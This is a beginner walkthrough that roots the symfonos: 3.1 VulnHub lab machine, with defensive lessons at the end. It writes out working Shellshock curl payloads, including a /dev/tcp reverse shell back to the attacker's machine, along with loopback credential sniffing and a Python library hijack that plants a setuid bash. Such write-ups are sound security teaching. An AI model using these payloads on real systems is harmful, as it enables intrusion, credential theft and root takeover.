# symfonos: 3.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 3.1 |
| **Difficulty** | Intermediate (author labels it "Intermediate — a test of your enumeration") |
| **Author** | Zayotic |
| **Released** | 7 April 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-31,332/> |
| **Download** | <https://vulnhub.com/entry/symfonos-31,332/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian (ProFTPD 1.3.5b, OpenSSH 7.4p1, Apache 2.4.25) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build"). The
> image on the page, the exact directory names, the CGI user's name and the sniffed
> credentials may differ between rebuilds, but the intended chain below is stable.
> The `3.1` release is a cleaner rebuild of `symfonos: 3` — same story, fewer rabbit
> holes.

---

## 0. What you will learn

- Why **enumeration is a discipline**: this box is beaten by *trying different
  wordlists* and *remembering the trailing slash* (`/dir/` vs `/dir`).
- How to build a **custom wordlist** from a site's own text using `cewl`.
- What a **`cgi-bin` directory** hints at — and how the **Shellshock** bug
  (CVE‑2014‑6271) gives remote code execution (RCE) from a single HTTP header.
- How to read your own identity on a box (`id`) and notice an unusual group.
- How to **sniff loopback traffic with `tcpdump`** to recover credentials sent in
  cleartext over FTP.
- How a **cron job running as root that imports a wildcarded Python library**
  (`ftplib`) can be hijacked to escalate to root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
   ________________________________________________________________________
   192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
   192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> **How to read it:** `netdiscover` (or `arp-scan -l`) lists live hosts on the
> subnet by watching ARP traffic. `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

> **Why we always start here:** an IP is only valid for *this* boot. Some writeups
> hard-code `10.10.10.10`; your target may be `192.168.56.101`. Always confirm.

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
```

```bash
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** only three services. `22` is for later (once we have a
> password), `80` is the web app we are about to attack, and `21` FTP is a **later**
> clue (remember it — a *root* process will log in over FTP and we will sniff it).

![Nmap scan output](images/02-nmap.png)

### 2.2 FTP — try the easy win first (and fail fast)

```bash
ftp 192.168.56.101
```

```text
Name (192.168.56.101:kali): anonymous
530 Login incorrect.
```

> **Why it matters:** anonymous FTP is *refused*. That is a dead end, and knowing it
> quickly stops you wasting time. Record it and move on to the web server.

### 2.3 Web — enumerate directories (and try *different* wordlists)

Browsing to `http://192.168.56.101/` shows only a picture. View the source; if your
build shows a comment, read it — but likely there is nothing useful.

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -recursion | tee ffuf.recurse
```

```text
gate                    [Status: 301, Size: 314]
cerberus                [Status: 301, Size: 316]
tartarus                [Status: 301, Size: 316]
research                [Status: 301, Size: 316]
hermes                  [Status: 301, Size: 314]
```

> **Why it works:** `ffuf` swaps `FUZZ` for each wordlist entry and reports which
> paths exist. `-recursion` re-runs inside every directory it finds. The names here
> are all **Greek underworld** words — and that is a hint.

Walk the directories: `http://192.168.56.101/gate/cerberus/tartarus/research` contains
a page *about* the Underworld and Greek mythology. Harvest its words into a wordlist:

```bash
cewl http://192.168.56.101/gate/cerberus/tartarus/research -w words.txt
```

> **Why it works:** `cewl` crawls the page and extracts its words. A site that talks
> about "Cerberus, Tartarus, Hades, Hermes, Underworld…" is quietly handing us the
> next directory names.

### 2.4 The two enumeration lessons that crack this box

**Lesson 1 — try a trailing slash.** Some servers only reveal a directory when you
ask with a trailing `/`:

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.slash
```

```text
cgi-bin/                [Status: 403, Size: 279]
```

> **Why it works:** `/cgi-bin/` exists but returns **403 Forbidden** on a plain
> listing. `cgi-bin` is a huge hint: it hosts **CGI scripts**, old shell-script
> programs that are famously vulnerable to **Shellshock**.

**Lesson 2 — lowercase the wordlist.** The first `cewl` run mixed cases; the server is
case-sensitive:

```bash
cewl --lowercase http://192.168.56.101/gate/cerberus/tartarus/research -w words2.txt
ffuf -ic -c -u http://192.168.56.101/cgi-bin/FUZZ -w words2.txt
```

```text
underworld              [Status: 200, Size: 1204]
```

We found the script: `http://192.168.56.101/cgi-bin/underworld`.

![Directory enumeration](images/03-enum.png)

---

## 3. Foothold

### 3.1 Confirm Shellshock (CVE‑2014‑6271)

Shellshock is a bug in **Bash** where a specially crafted *environment variable* is
executed when Bash starts. CGI scripts are launched by the web server with the
request's HTTP headers copied into the environment — so a malicious `User-Agent`
runs as a command.

```bash
curl -A "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://192.168.56.101/cgi-bin/underworld
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
cerberus:x:1001:1001::/home/cerberus:/bin/bash
hades:x:1002:1002::/home/hades:/bin/bash
```

> **Why it works:** the `User-Agent` value begins with `() { :; };` — a Bash *function
> definition*. Bash evaluates the rest (`cat /etc/passwd`) before the script even
> runs. We are now executing commands on the target. We also learned two usernames:
> `cerberus` and `hades`.

![Shellshock confirmed](images/04-shellshock.png)

### 3.2 A reverse shell

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Then trigger a callback with Shellshock:

```bash
curl -A "() { :; }; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.10/4444 0>&1 &'" \
  http://192.168.56.101/cgi-bin/underworld
```

```text
$ id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),1003(pcap)
```

> **Why it works:** `/dev/tcp/…` is a Bash feature that opens a TCP connection
> without any external tool. We redirect the shell's input/output through it back to
> our listener. The `&` backgrounds it so the HTTP response still returns.
> **Note:** on some builds the CGI runs as `www-data` instead of `cerberus`; what
> matters is the group membership below ("varies by build").

![Reverse shell foothold](images/05-foothold.png)

### 3.3 Upgrade to a full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on Kali:
stty raw -echo; fg
# back on target:
export TERM=xterm
```

> **Why it works:** a raw `nc` shell has no job control, no tab completion and no
> `Ctrl+C`. `pty.spawn` gives Bash a pseudo-terminal so interactive tools behave.

### 3.4 Spot the unusual group

```bash
id
find / -group pcap -ls 2>/dev/null
```

```text
-rwxr-xr-x 1 root pcap /usr/sbin/tcpdump
-rwsr-x--- 1 root pcap /usr/sbin/tcpdump  <-- (on some builds tcpdump is group-runnable)
```

> **Why it works:** the user is in the **`pcap`** group — the group that can capture
> network packets. That means we are able to run `tcpdump`. Remember port 21 is open.

---

## 4. Privilege escalation

### 4.1 Find the running job

Upload and run [`pspy`](https://github.com/DominicBreuker/pspy) to watch processes
without needing root:

```bash
./pspy64
```

```text
CMD: UID=0  PID=...  | /usr/bin/python2.7 /opt/ftpclient/ftpclient.py
```

> **Why it works:** `pspy` reads `/proc` to show *new* processes. A script running as
> **UID=0 (root)** on a timer is almost always a cron job — and a prime target.

### 4.2 Sniff the FTP credentials off loopback

The root job logs into FTP, and FTP sends passwords in **cleartext**. Because the
connection goes over `lo` (loopback), we can capture it locally:

```bash
tcpdump -i lo -n -A port 21
```

```text
USER hades
PASS PTpZTfU4vxgzvRBE
230 Login successful.
```

> **Why it works:** `tcpdump` on the loopback interface shows traffic between local
> processes. FTP has **no encryption**, so the username and password appear in plain
> text. We now hold `hades`'s credentials.
> **Note:** the exact password string varies by build.

### 4.3 Become `hades`

```bash
ssh hades@192.168.56.101
# password: PTpZTfU4vxgzvRBE

id
find / -group gods -ls 2>/dev/null
```

```text
uid=1002(hades) gid=1002(hades) groups=1002(hades),1003(gods)
...
drwxrwxr-x 1 root gods /usr/lib/python2.7
```

> **Why it works:** `hades` is in the **`gods`** group, which has **write** access to
> `/usr/lib/python2.7`. Root runs a `python2.7` script from there via cron.

### 4.4 Hijack an imported library

Recall the root cron job: `/usr/bin/python2.7 /opt/ftpclient/ftpclient.py`. That script
imports **`ftplib`**, which lives in the writable library directory. Replace it:

```bash
cat > /usr/lib/python2.7/ftplib.py <<'EOF'
import os
os.system('cp /bin/bash /tmp/bash')
os.system('chmod +s /tmp/bash')
EOF
```

> **Why it works:** Python searches `sys.path` (which includes
> `/usr/lib/python2.7`) for `ftplib.py` at import time. Our file is imported by the
> **root** process, so `os.system(...)` runs as root and plants a **setuid copy of
> Bash** at `/tmp/bash`.

Wait for the cron job, then:

```bash
ls -l /tmp/bash
/tmp/bash -p
```

```text
-rwsr-sr-x 1 root root /tmp/bash
# whoami
root
```

> **Why it works:** the `s` (setuid) bit makes `/tmp/bash` run as **its owner (root)**
> no matter who starts it. `-p` tells Bash to *keep* the elevated privilege.

![Privilege escalation to root](images/06-privesc.png)

### 4.5 The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on rooting symfonos:3.1!
(symfonos root proof)
```

![Root flag](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden directories (no trailing slash / case mismatch) | `/cgi-bin/underworld` | Discovered only by better enumeration |
| 2 | **Shellshock** CVE‑2014‑6271 in Bash | `/cgi-bin/underworld` via `User-Agent` | Remote Code Execution as the CGI user |
| 3 | Cleartext FTP + readable loopback | `tcpdump -i lo port 21` | Recovers `hades`'s password |
| 4 | Over-broad `pcap` group | member of `pcap` | Lets a low-priv user capture network traffic |
| 5 | World-writable Python library dir | `/usr/lib/python2.7` (`gods` group) | `ftplib` hijack |
| 6 | Root cron imports a hijackable library | `/opt/ftpclient/ftpclient.py` | Arbitrary code as root |
| 7 | Setuid Bash | `/tmp/bash` planted by the payload | Direct root shell |

## 6. Defensive lessons (blue team)

- **Patch Bash.** Shellshock has been fixed since 2014; any unpatched CGI host is a
  time bomb. Prefer modern frameworks over hand-rolled CGI.
- **Do not pass HTTP headers into the environment of privileged shell scripts**
  unnecessarily, and never run CGI as a shell that can be influenced by input.
- **Encrypt management traffic.** Replace FTP with SFTP/SCP. A cleartext password on
  the wire is a password given away.
- **Apply least privilege to groups.** `pcap` (and `docker`, `adm`, `sudo`) grant far
  more than most users need. Audit group membership regularly.
- **Lock down library directories.** `/usr/lib/python2.7` should never be writable by
  a non-root group. Install dependencies under a controlled path.
- **Cron jobs must not import attacker-writable modules.** Run scheduled scripts from
  a root-owned directory with a fixed `sys.path`, and use absolute imports.
- **Detection ideas:** alert on HTTP requests whose `User-Agent` contains `() {`; on
  `tcpdump` execution by non-admins; on writes to system library directories; and on
  new setuid files under `/tmp` (`auditd`, `falco`).

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/symfonos-31,332/>
- Community writeups consulted:
  - [Vulnhub: Symfonos 3 — ikuamike](https://blog.ikuamike.io/posts/2021/symfonos3/)
  - [Symfonos:3 writeup — A70xa (GitHub)](https://github.com/A70xa/Vulnhub-Writeups/blob/main/Symfonos:3/Symfonos:3.md)
  - [Symfonos 3.1 Walkthrough — news4hackers](https://www.news4hackers.com/symfonos-3-1-vuln-hub-machine-walkthrough/)
- Vendor advisories / docs:
  - [CVE‑2014‑6271 (Shellshock) — NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
  - [Shellshock — Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
  - [HackTricks — Shellshock](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
  - [GTFOBins](https://gtfobins.github.io/) — abusing SUID/sudo binaries
  - [pspy — DominicBreuker (GitHub)](https://github.com/DominicBreuker/pspy)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`ip a` / `netdiscover`)
- [ ] `images/02-nmap.png` — port/service scan (21, 22, 80)
- [ ] `images/03-enum.png` — directory enumeration (`cgi-bin` + `underworld`)
- [ ] `images/04-shellshock.png` — confirming Shellshock with `curl -A`
- [ ] `images/05-foothold.png` — reverse shell as `cerberus`
- [ ] `images/06-privesc.png` — `ftplib` hijack → setuid Bash → root
- [ ] `images/07-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
